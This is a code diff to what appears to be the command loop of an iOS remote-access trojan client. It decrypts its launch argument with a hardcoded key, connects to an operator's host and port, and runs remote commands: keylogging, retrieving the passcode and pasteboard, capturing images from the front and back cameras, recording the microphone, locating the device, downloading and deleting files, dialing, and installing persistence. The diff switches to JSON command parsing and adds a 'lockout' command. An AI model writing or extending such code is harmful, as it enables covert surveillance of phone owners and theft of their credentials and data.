@@ -10,7 +10,7 @@ espl *_espl;
 
 NSString *tmpData = @"";
 NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
-@"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",@"keylogclear",@"togglemute",nil];
+@"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",@"keylogclear",@"togglemute",@"lockout",nil];
 NSArray *yesReplyCommands = [[NSArray alloc] initWithObjects:
 @"ismuted",@"getpasscode",@"getpaste",@"unlock",@"keylog",@"lastapp",@"islocked",nil];
 
@@ -26,16 +26,13 @@ int main(int argc, char **argv, char **envp) {
     if (argc == 1) { return 0; }
     //decrypt argument with shared key
     NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
-    HBLogDebug(@"encrypted argument = %@",argument);
     argument = [escryptor decryptB64ToNSString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV" :argument];
-    HBLogDebug(@"checking if null");
     if (argument == NULL) {
         HBLogDebug(@"its nil on the why");
     }
     //obtain real args from decrypted argument
     NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
     //connect to host:port args
-    HBLogDebug(@"connecting");
     int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
     //set escryptor key from args
     _espl.skey = args[2];
@@ -51,93 +48,102 @@ int main(int argc, char **argv, char **envp) {
         NSString *command;
         char buffer[2048];
         while (read(sockfd, &buffer, sizeof(buffer))) {
-            command = [NSString stringWithFormat:@"%s",buffer];
-            command = [escryptor decryptB64ToNSString:_espl.skey :command];
-            NSArray *cmdarray = [command componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+            //decrypt received data
+            command = [escryptor decryptB64ToNSString:_espl.skey :
+                       [NSString stringWithFormat:@"%s",buffer]];
+            //json decode
+            NSDictionary *receivedDictionary = [NSJSONSerialization JSONObjectWithData: [command dataUsingEncoding:NSUTF8StringEncoding]
+                                                                               options: NSJSONReadingAllowFragments
+                                                                                 error: nil];
+            //assign
+            NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
+            NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
+            
+            _espl.terminator = [receivedDictionary objectForKey:@"term"];
         
-            if ([cmdarray[0] isEqualToString: @"exit"]) {
+            if ([cmd isEqualToString: @"exit"]) {
                 exit(1);
             }
-            else if ([cmdarray[0] isEqualToString: @"getpid"]) {
+            else if ([cmd isEqualToString: @"getpid"]) {
                 [_espl getPid];
             }
-            else if ([cmdarray[0] isEqualToString: @"vibrate"]) {
+            else if ([cmd isEqualToString: @"vibrate"]) {
                 [_espl vibrate];
             }
-            else if ([cmdarray[0] isEqualToString: @"alert"]) {
-                [_espl alert:cmdarray];
+            else if ([cmd isEqualToString: @"alert"]) {
+                [_espl alert:[cmdArgument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]]];
             }
-            else if ([cmdarray[0] isEqualToString: @"reboot"]) {
+            else if ([cmd isEqualToString: @"reboot"]) {
                 [_espl exec:@"reboot"];
             }
-            else if ([cmdarray[0] isEqualToString: @"ls"]) {
-                [_espl directoryList:cmdarray];
+            else if ([cmd isEqualToString: @"ls"]) {
+                [_espl directoryList:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"cd"]) {
-                [_espl changeWD:cmdarray];
+            else if ([cmd isEqualToString: @"cd"]) {
+                [_espl changeWD:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"rm"]) {
-                [_espl rmFile:cmdarray];
+            else if ([cmd isEqualToString: @"rm"]) {
+                [_espl rmFile:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"pwd"]) {
+            else if ([cmd isEqualToString: @"pwd"]) {
                 [_espl sendString:filemanager.currentDirectoryPath];
             }
-            else if ([cmdarray[0] isEqualToString: @"download"]) {
-                [_espl download:cmdarray];
+            else if ([cmd isEqualToString: @"download"]) {
+                [_espl download:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"setvol"]) {
-                [_espl setVolume:cmdarray];
+            else if ([cmd isEqualToString: @"setvol"]) {
+                [_espl setVolume:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"getvol"]) {
+            else if ([cmd isEqualToString: @"getvol"]) {
                 [_espl getVolume];
             }
-            else if ([cmdarray[0] isEqualToString: @"isplaying"]) {
+            else if ([cmd isEqualToString: @"isplaying"]) {
                 [_espl isplaying];
             }
-            else if ([cmdarray[0] isEqualToString: @"openurl"]) {
-                [_espl openURL:cmdarray];
+            else if ([cmd isEqualToString: @"openurl"]) {
+                [_espl openURL:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"dial"]) {
-                [_espl dial:cmdarray];
+            else if ([cmd isEqualToString: @"dial"]) {
+                [_espl dial:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"frontcam"]) {
+            else if ([cmd isEqualToString: @"frontcam"]) {
                 [_espl camera:true];
             }
-            else if ([cmdarray[0] isEqualToString: @"backcam"]) {
+            else if ([cmd isEqualToString: @"backcam"]) {
                 [_espl camera:false];
             }
-            else if ([cmdarray[0] isEqualToString: @"mic"]) {
-                [_espl mic:cmdarray];
+            else if ([cmd isEqualToString: @"mic"]) {
+                [_espl mic:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"locate"]) {
+            else if ([cmd isEqualToString: @"locate"]) {
                 [_espl locate];
             }
-            else if ([cmdarray[0] isEqualToString: @"respring"]) {
+            else if ([cmd isEqualToString: @"respring"]) {
                 [_espl exec:@"killall SpringBoard"];
                 [_espl blank];
             }
-            else if ([cmdarray[0] isEqualToString: @"battery"]) {
+            else if ([cmd isEqualToString: @"battery"]) {
                 [_espl sendString:[_espl battery]];
             }
-            else if ([cmdarray[0] isEqualToString: @"listapps"]) {
+            else if ([cmd isEqualToString: @"listapps"]) {
                 [_espl listapps];
             }
-            else if ([cmdarray[0] isEqualToString: @"open"]) {
-                [_espl launchApp:cmdarray];
+            else if ([cmd isEqualToString: @"open"]) {
+                [_espl launchApp:cmdArgument];
             }
-            else if ([cmdarray[0] isEqualToString: @"sysinfo"]) {
+            else if ([cmd isEqualToString: @"sysinfo"]) {
                 [_espl sysinfo];
             }
-            else if ([cmdarray[0] isEqualToString: @"say"]) {
+            else if ([cmd isEqualToString: @"say"]) {
                 [_espl say:[command stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
             }
-            else if ([cmdarray[0] isEqualToString: @"persistence"]) {
+            else if ([cmd isEqualToString: @"persistence"]) {
                 [_espl persistence:[NSString stringWithFormat:@"%@",args[0]]:atoi([args[1] UTF8String])];
             }
-            else if ([cmdarray[0] isEqualToString: @"rmpersistence"]) {
+            else if ([cmd isEqualToString: @"rmpersistence"]) {
                 [_espl rmpersistence];
             }
-            else if ([cmdarray[0] isEqualToString: @"installpro"]) {
+            else if ([cmd isEqualToString: @"installpro"]) {
                 if (getuid() == 0) {
                     [_espl sendString:@"1"];
                     [_espl upload:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib"];
@@ -149,14 +155,14 @@ int main(int argc, char **argv, char **envp) {
                 }
             }
             //PRO Commands
-            else if ([cmdarray[0] isEqualToString: @"locationservice"]) {
-                [_espl locationService:cmdarray];
+            else if ([cmd isEqualToString: @"locationservice"]) {
+                [_espl locationService:cmdArgument];
             }
-            else if ([noReplyCommands containsObject:cmdarray[0]]) {
-                [_espl mcSendNoReply:cmdarray[0]];
+            else if ([noReplyCommands containsObject:cmd]) {
+                [_espl mcSendNoReply:cmd];
             }
-            else if ([yesReplyCommands containsObject:cmdarray[0]]) {
-                [_espl mcSendYesReply:cmdarray[0]];
+            else if ([yesReplyCommands containsObject:cmd]) {
+                [_espl mcSendYesReply:cmd];
             }
             else {
                 [_espl sendString:@"-1"];
